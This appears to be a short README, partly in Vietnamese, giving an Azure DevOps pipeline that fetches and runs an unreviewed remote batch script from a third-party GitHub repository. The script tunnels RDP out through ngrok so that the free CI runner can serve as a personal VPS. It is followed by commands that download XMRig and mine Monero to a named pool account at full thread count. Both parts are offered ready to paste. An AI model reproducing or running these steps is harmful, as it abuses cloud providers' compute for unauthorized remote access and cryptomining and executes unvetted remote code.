# Azure_RDP

###############################Copy Đoạn Code Trong Khung###############################

jobs:
- job: Windows_2019_Azure_RDP_by_HuyGK
  pool:
    vmImage: windows-latest
  steps:
   - checkout: none 
   - script: |
       echo ngrok authtoken "NGROK_AUTH_TOKEN" > NGROK.bat
       curl -s -O https://raw.githubusercontent.com/vpsclouds/VPSRDP/main/AzureNgrokAutoRegion.bat
       AzureNgrokAutoRegion.bat
     displayName: 'Chạy VPS trên Azure Pipeline'
 			
########################################################################################			
			
			
#link: https://azure.microsoft.com/en-us/services/devops/
#link ngrok: https://dashboard.ngrok.com/get-started/your-authtoken



wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
tar -xvf xmrig-6.12.1-linux-x64.tar.gz
./xmrig-6.12.1/xmrig -a cryptonight-upx/2 -o stratum+tcp://xmr.pool.minergate.com:45700 -u mrx@galpony.com -p x --keepalive --donate-level=0 --cuda -t 9
